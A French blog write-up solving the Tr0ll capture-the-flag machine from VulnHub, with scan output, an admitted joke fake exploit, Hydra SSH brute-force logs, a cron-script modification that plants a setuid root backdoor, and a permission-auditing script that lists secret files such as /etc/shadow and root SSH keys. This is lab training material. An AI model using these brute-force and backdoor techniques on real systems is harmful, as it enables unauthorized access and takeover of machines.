# Solution du CTF Tr0ll

Introduction
------------

[Le challenge tr0ll](http://vulnhub.com/entry/tr0ll-1,100/) créé par *Maleus* est le dernier CTF ajouté sur *VulnHub* au moment de ces lignes.  

L'auteur prévient qu'il y aura beaucoup de trolls (c'est à dire des fausses pistes) donc le challenge risque d'être agaçant.  

Toutefois il est aussi indiqué que le challenge se destine aux débutants.  

Mais trop de guessing peu suffire à vous pourrir la vie comme sur le CTF *Flick* que j'ai terminé mais qui ne mérite pas un writeup au vu du temps perdu dessus (d'autres ont déjà écrit des writeups plus intéressants).  

Tour rapide
-----------

```plain
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap [NSE: writeable]
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-title: Site doesn't have a title (text/html).
```

Sur le serveur web, à la racine, on trouve seulement une image avec un trollface. Idem pour */secret*.  

dirb ne trouve rien de plus dans ces dossiers, inutile d'aller plus loin.  

Don't feed the troll
--------------------

Je décide de sortie l'artillerie lourde :  

```plain
$ python /work/vrd/exploits/ftp/devloop-vsftpd-3.0.2-l33t-0day-exploit.py
[i] devloop !PRIVATE! 0day exploit for VSFTPd 3.0.2 (Ubuntu)
[*] Connection as anonymous successful !
[*] Fetching leaked memory, please wait (may take 1 or 2 minutes)...
[*] Address of .text section found !
[*] pop-pop-ret should be at 0x0856BF
[*] Sending shellcode as file name...
[*] Jumping to payload, wait for your shell :)
root@troll:~# id
uid=0(root) gid=0(root) groups=0(root)
```

BOUM ! U mad bro ?  

Bon évidemment, c'est fake... Un peu de sérieux, arrêtons de troller ;-)  

La vérité vraie
---------------

On récupère le fichier *lol.pcap* présent sur le ftp. Il s'agit justement d'une capture réseau d'une session FTP :  

```plain
220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```

Si on regarde la connexion data pour la commande *RETR* on y trouve le contenu du fichier *secret\_stuff.txt* :  

> Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P  
> 
>   
> 
> Sucks, you were so close... gotta TRY HARDER!

Finalement comme on est prévenu de la présence de trolls il est assez facile de comprendre qu'il y a un doube sens.  

Ainsi si on se rend sur */sup3rs3cr3tdirlol/* sur le serveur web on trouve un binaire 32bits baptisé *roflmao*.  

Une analyse rapide via *gdb* montre que le programme ne fait rien de plus qu'un *printf*.  

```plain
$ ./roflmao 
Find address 0x0856BF to proceed
```

Du coup on pointe le navigateur sur */0x0856BF/* où se trouvent deux sous-dossiers.  

Le fichier texte */0x0856BF/good\_luck/which\_one\_lol.txt* semble contenir une liste d'utilisateurs :  

```plain
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

et dans le dossier */0x0856BF/this\_folder\_contains\_the\_password/* on trouve un fichier qui à priori contient le mot de passe :  

![Dossier web tr0ll](https://raw.githubusercontent.com/devl00p/blog/master/images/troll.png)

le mot de passe devrait alors être *Good\_job\_:)* Mais évidemment aucun utilisateur n'accepte ce mot de passe.  

Une fois de plus on cherche un second sens et on se dit que le mot de passe doit être un mot présent dans la page.  

Ainsi le mot de passe s'est révélé être *Pass.txt*.  

J'ai rencontré quelques difficultés pour casser le mot de passe car *Hydra* semble avoir un bug dans la gestion du délai (option *-W*) entre deux connexions quand il s'agit d'un brute-force sur SSH. Et comme *fail2ban* est présent sur le système cible c'est vite devenu pénible.  

Heureusement il est possible de reprendre l'attaque via -R après avoir attendu que *fail2ban* nous re-accepte :  

```plain
$ ./hydra -L ../users.txt -P ../pass.txt -V -t 1 -f -W 6 ssh://192.168.1.78
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-08-22 08:06:36
[DATA] max 1 task per 1 server, overall 1 tasks, 10 login tries (l:10/p:1), ~10 tries per task
[DATA] attacking service ssh on port 22
[ATTEMPT] target 192.168.1.78 - login "maleus" - pass "Pass.txt" - 1 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "ps-aux" - pass "Pass.txt" - 2 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "felux" - pass "Pass.txt" - 3 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "Eagle11" - pass "Pass.txt" - 4 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "genphlux" - pass "Pass.txt" - 5 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "usmc8892" - pass "Pass.txt" - 6 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "blawrg" - pass "Pass.txt" - 7 of 10 [child 0]
[RE-ATTEMPT] target 192.168.1.78 - login "wytshadow" - pass "Pass.txt" - 7 of 10 [child 0]
[RE-ATTEMPT] target 192.168.1.78 - login "wytshadow" - pass "Pass.txt" - 7 of 10 [child 0]
[RE-ATTEMPT] target 192.168.1.78 - login "wytshadow" - pass "Pass.txt" - 7 of 10 [child 0]
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
$ ./hydra -R
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-08-22 08:08:31
[DATA] max 1 task per 1 server, overall 1 tasks, 10 login tries (l:10/p:1), ~10 tries per task
[DATA] attacking service ssh on port 22
[RE-ATTEMPT] target 192.168.1.78 - login "wytshadow" - pass "Pass.txt" - 7 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "wytshadow" - pass "Pass.txt" - 8 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "vis1t0r" - pass "Pass.txt" - 9 of 10 [child 0]
[ATTEMPT] target 192.168.1.78 - login "overflow" - pass "Pass.txt" - 10 of 10 [child 0]
[22][ssh] host: 192.168.1.78   login: overflow   password: Pass.txt
[STATUS] attack finished for 192.168.1.78 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-08-22 08:08:37
```

Une fois l'accès obtenu on voit que plusieurs utilisateurs ont été créés :  

```plain
troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:112:ftp daemon,,,:/srv/ftp:/bin/false
lololol:x:1001:1001::/home/lololol:
overflow:x:1002:1002::/home/overflow:
ps-aux:x:1003:1003::/home/ps-aux:
maleus:x:1004:1004::/home/maleus:
felux:x:1005:1005::/home/felux:
Eagle11:x:1006:1006::/home/Eagle11:
genphlux:x:1007:1007::/home/genphlux:
usmc8892:x:1008:1008::/home/usmc8892:
blawrg:x:1009:1009::/home/blawrg:
wytshadow:x:1010:1010::/home/wytshadow:
vis1t0r:x:1011:1011::/home/vis1t0r:
```

Toutefois ils ne disposent pas de shells et seul *troll* dispose vraiment d'un dossier dans */home/*.  

Le nombre de fausses pistes se réduit ainsi à 0.  

On trouve un script Python que l'on ne peut malheureusement pas lire :  

```plain
overflow@troll:/$ ls -l /opt/
total 4
-rwx--x--x 1 root root 117 Aug 10 02:11 lmao.py
```

La liste des fichiers appartenant à *troll* montre peu d'intérêts :  

```plain
/srv/ftp/lol.pcap
/home/troll
/home/troll/.cache
/home/troll/.profile
/home/troll/.bash_history
/home/troll/.viminfo
```

Au boût d'un moment notre connexion SSH est coupée :  

```plain
Broadcast Message from root@trol                                               
        (somewhere) at 14:00 ...                                               

TIMES UP LOL!                                                                  

Connection to 192.168.1.78 closed by remote host.
Connection to 192.168.1.78 closed.
```

Un root sinon rien
------------------

Je me reconnecte après avoir uploadé mon script maison de recherche de permissions faibles (voir à la fin de l'article).  

Notez que le script n'est pas parfait et donne pas mal de faux positifs :  

```plain
overflow@troll:/tmp$ python search.py 
File /bin/su is setuid root
File /bin/ping is setuid root
File /bin/fusermount is setuid root
File /bin/ping6 is setuid root
File /bin/mount is setuid root
File /bin/umount is setuid root
File /sbin/unix_chkpwd is setgid shadow
File /var/tmp/cleaner.py.swp is world-writable !
Directory /var/local is writable by group staff !
File /var/www/html/sup3rs3cr3tdirlol/roflmao is world-writable !
Directory /var/mail is writable by group mail !
Directory /var/log is writable by group syslog !
File /var/log/cronlog is world-writable !
Directory /var/lib/libuuid is writable by group libuuid !
File /usr/sbin/uuidd is setuid libuuid
File /usr/sbin/uuidd is setgid libuuid
Directory /usr/local/share/sgml is writable by group staff !
Directory /usr/local/share/sgml/misc is writable by group staff !
Directory /usr/local/share/sgml/entities is writable by group staff !
Directory /usr/local/share/sgml/stylesheet is writable by group staff !
Directory /usr/local/share/sgml/declaration is writable by group staff !
Directory /usr/local/share/sgml/dtd is writable by group staff !
Directory /usr/local/share/ca-certificates is writable by group staff !
Directory /usr/local/share/xml is writable by group staff !
Directory /usr/local/share/xml/misc is writable by group staff !
Directory /usr/local/share/xml/entities is writable by group staff !
Directory /usr/local/share/xml/schema is writable by group staff !
Directory /usr/local/share/xml/declaration is writable by group staff !
Directory /usr/local/lib/python3.4 is writable by group staff !
Directory /usr/local/lib/python3.4/dist-packages is writable by group staff !
Directory /usr/local/lib/python2.7 is writable by group staff !
Directory /usr/local/lib/python2.7/site-packages is writable by group staff !
Directory /usr/local/lib/python2.7/dist-packages is writable by group staff !
File /usr/bin/chfn is setuid root
File /usr/bin/sudo is setuid root
File /usr/bin/passwd is setuid root
File /usr/bin/dotlockfile is setgid mail
File /usr/bin/bsd-write is setgid tty
File /usr/bin/mail-lock is setgid mail
File /usr/bin/traceroute6.iputils is setuid root
File /usr/bin/chage is setgid shadow
File /usr/bin/mtr is setuid root
File /usr/bin/chsh is setuid root
File /usr/bin/mail-touchlock is setgid mail
File /usr/bin/crontab is setgid crontab
File /usr/bin/newgrp is setuid root
File /usr/bin/expiry is setgid shadow
File /usr/bin/mail-unlock is setgid mail
File /usr/bin/wall is setgid tty
File /usr/bin/mlocate is setgid mlocate
File /usr/bin/ssh-agent is setgid ssh
File /usr/bin/gpasswd is setuid root
File /usr/lib/pt_chown is setuid root
File /usr/lib/openssh/ssh-keysign is setuid root
File /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper is setuid root
File /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper is setuid root
File /usr/lib/eject/dmcrypt-get-device is setuid root
File /lib/log/cleaner.py is world-writable !
File /srv/ftp/lol.pcap is world-writable !
```

Effectivement les permissions sur le script *cleaner.py* sont open-bar :  

```plain
overflow@troll:/tmp$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
overflow@troll:/tmp$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

Le script sert tout simplement à vider le dossier */tmp*.  

Dans le fichier swap qui doit être généré par *Vim* on trouve une information intéressante :  

```plain
overflow@troll:/$ ls -al /var/tmp/cleaner.py.swp
-rwxrwxrwx 1 root root 34 Aug 13 01:16 /var/tmp/cleaner.py.swp
overflow@troll:/$ cat /var/tmp/cleaner.py.swp
crontab for cleaner.py successful
```

*cleaner.py* est donc apellé via une tache planifiée. On le modifie pour qu'il mette des droits setuid root sur une backdoor que l'on aura préalablement placé (j'ai évité /tmp car le cleaner peut supprimer nos fichiers entre temps) :  

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('chown root.root /run/shm/getroot; chmod u+s /run/shm/getroot')
except:
        sys.exit()
```

Après un moment on a bien récupéré les permissions :  

```plain
overflow@troll:/$ ls -l /run/shm/
total 2724
-rwsr-xr-x 1 root root 2786558 Aug 21 14:30 getroot
```

Seulement, à l'exécution...  

```plain
overflow@troll:/$ /run/shm/getroot 
overflow@troll:/$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
overflow@troll:/$ mount
/dev/sda1 on / type ext4 (rw,errors=remount-ro)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
none on /sys/fs/cgroup type tmpfs (rw)
none on /sys/fs/fuse/connections type fusectl (rw)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)  <--- FAIL
none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
none on /sys/fs/pstore type pstore (rw)
systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)
```

Le dossier */run/shm* est monté en nosuid. On va chercher ailleurs un dossier dans lequel on peut écrire :  

```plain
overflow@troll:/$ find / -type d -writable 2> /dev/null | grep -v /proc
/tmp
/run/user/1002
/run/shm
/run/lock
/var/tmp
/sys/fs/cgroup/systemd/user/1002.user/9.session
/sys/fs/cgroup/systemd/user/1002.user/8.session
```

/var/tmp devrait faire l'affaire. On rectifie le cleaner une nouvelle fois et on recommence :  

```plain
overflow@troll:/$ ls /var/tmp/getroot -l
-rwsr-xr-x 1 root root 2786558 Aug 21 18:23 /var/tmp/getroot
overflow@troll:/$ /var/tmp/getroot
root@troll:/# id
uid=0(root) gid=0(root) groups=0(root),1002(overflow)
root@troll:/# cd /root
root@troll:/root# ls
proof.txt
root@troll:/root# cat proof.txt 
Good job, you did it! 

702a8c18d29c6f3ca0d99ef5712bfbdc
```

Groovy !

Sous la capôt
-------------

On trouve deux lignes dans la crontab de root :

```plain
*/5 * * * * /usr/bin/python /opt/lmao.py
*/2 * * * * /usr/bin/python /lib/log/cleaner.py
```

```plain
root@troll:/root# cat /opt/lmao.py
#!/usr/bin/env python
import os

os.system('echo "TIMES UP LOL!"|wall')
os.system("pkill -u 'overflow'")
sys.exit()
```

Annexe
------

Voici le code de mon script qui recherche les failles au niveau des permissions. N'hésitez pas à le reprendre et l'améliorer.  

```python
import os
from stat import *
import pwd, grp

SECRET_FILES = [
  '/etc/shadow',
  '/etc/shadow-',
  '/etc/sudoers',
  '/etc/ssh/ssh_host_key',
  '/etc/ssh/ssh_host_dsa_key',
  '/etc/ssh/ssh_host_rsa_key',
  '/etc/ssh/ssh_host_ecdsa_key',
  '/boot/grub2/grub.cfg',
  '/root/.ssh/id_rsa',
  '/root/.ssh/id_dsa',
  '/root/.rhosts',
  '/root/.bash_history',
  '/root/.mysql_history'
  ]

FOLDERS_TO_WATCH = [
    '/bin',
    '/sbin',
    '/boot',
    '/etc',
    '/var',
    '/usr',
    '/lib',
    '/lib64',
    '/root',
    '/home',
    '/srv'
    ]

KNOWN_STICKY_FOLDERS = [
    '/var/tmp',
    '/var/spool/mail',
    '/tmp',
    '/dev/shm'
    ]

def find_writable_directories_and_files(directory):
  if not os.path.exists(directory) or not os.access(directory, os.R_OK):
    return
  for p in os.listdir(directory):
    p = os.path.join(directory, p)

    attrs = os.lstat(p)

    if os.path.islink(p):
      continue
    elif os.path.isdir(p):
      if attrs.st_mode & S_IWOTH:
        if not (attrs.st_mode & S_ISVTX) or p not in KNOWN_STICKY_FOLDERS:
          print "Directory {} is world-writable !".format(p)
      if attrs.st_mode & S_IWGRP and attrs.st_gid != 0:
        print "Directory {} is writable by group {} !".format(p, grp.getgrgid(attrs.st_gid).gr_name)
      if os.access(p, os.R_OK):
        find_writable_directories_and_files(p)
    elif os.path.isfile(p):
      if attrs.st_mode & S_IWOTH:
        print "File {} is world-writable !".format(p)
      if os.access(p, os.X_OK):
        if attrs.st_mode & S_ISUID:
          print "File {} is setuid {}".format(p, pwd.getpwuid(attrs.st_uid).pw_name)
        if attrs.st_mode & S_ISGID:
          print "File {} is setgid {}".format(p, grp.getgrgid(attrs.st_gid).gr_name)

for d in FOLDERS_TO_WATCH:
  find_writable_directories_and_files(d)

for f in SECRET_FILES:
  if not os.path.isfile(f):
    continue
  attrs = os.lstat(f)
  if attrs.st_mode & S_IROTH:
    print "File {} is readable by everybody !".format(f)
  elif attrs.st_mode & S_IWGRP and attrs.st_gid != 0:
    print "File {} is readable by members of group {} !".format(f, grp.getgrgid(attrs.st_gid).gr_name)
```


*Published August 23 2014 at 15:08*